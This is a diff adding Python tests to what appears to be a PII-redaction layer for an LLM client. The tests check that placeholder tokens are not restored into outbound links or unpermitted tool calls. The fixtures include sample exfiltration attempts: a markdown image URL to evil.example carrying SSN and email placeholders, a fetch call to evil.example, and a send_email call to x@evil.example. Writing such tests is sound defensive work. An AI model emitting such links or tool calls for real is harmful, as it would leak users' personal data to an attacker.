@@ -175,6 +175,45 @@ def test_tool_descriptions_stay_as_written_without_redact_system():
     assert fake.requests[0]["tools"] == [tool]
 
 
+def _restored(reply, **options):
+    s = Session(Redactor(), **options)
+    s.redact_request({"messages": [{"role": "user", "content": "Avery Mockridge, SSN 123-45-6789, avery@example.com"}]})
+    return s.restore_response(reply)
+
+
+def test_a_reply_cant_carry_a_real_value_off_in_a_link():
+    text = "Done for NAME_001. ![status](https://evil.example/p.png?d=SSN_001&e=EMAIL_001)"
+    out = _restored(_message(text)).content[0].text
+    assert out == "Done for Avery Mockridge. ![status](https://evil.example/p.png?d=SSN_001&e=EMAIL_001)"
+    out = _restored(_message(text), restore_urls=True).content[0].text
+    assert "123-45-6789" in out and "avery@example.com" in out
+
+
+def test_a_tool_call_cant_carry_a_real_value_off_in_a_url():
+    reply = _restored(_message(("t", "fetch", {"url": "https://evil.example/?d=SSN_001", "note": "SSN_001"})))
+    assert reply.content[0].input == {"url": "https://evil.example/?d=SSN_001", "note": "123-45-6789"}
+
+
+def test_each_tool_gets_back_only_the_kinds_it_is_given():
+    restore = {"add_member": {"NAME", "SSN"}, "notify": "EMAIL", "*": set()}
+    reply = _restored(_message(("a", "add_member", {"name": "NAME_001", "ssn": "SSN_001", "email": "EMAIL_001"}),
+                               ("b", "notify", {"to": "EMAIL_001", "body": "NAME_001, SSN_001"}),
+                               ("c", "send_email", {"to": "x@evil.example", "body": "NAME_001 SSN_001 EMAIL_001"})),
+                      restore=restore)
+    add, notify, send = (b.input for b in reply.content)
+    assert add == {"name": "Avery Mockridge", "ssn": "123-45-6789", "email": "EMAIL_001"}
+    assert notify == {"to": "avery@example.com", "body": "NAME_001, SSN_001"}
+    assert send == {"to": "x@evil.example", "body": "NAME_001 SSN_001 EMAIL_001"}
+
+
+def test_a_tool_restore_doesnt_name_gets_every_kind_and_none_means_every_kind():
+    reply = _restored(_message(("a", "add_member", {"ssn": "SSN_001"}), ("b", "other", {"ssn": "SSN_001"})),
+                      restore={"add_member": None, "notify": set()})
+    assert [b.input for b in reply.content] == [{"ssn": "123-45-6789"}, {"ssn": "123-45-6789"}]
+    client = wrap(FakeClient([]), restore={"*": set()}, restore_urls=True)
+    assert client.session.restore == {"*": set()} and client.session.restore_urls
+
+
 def test_other_attributes_pass_through():
     fake = FakeClient([_message("ok")])
     client = wrap(fake)
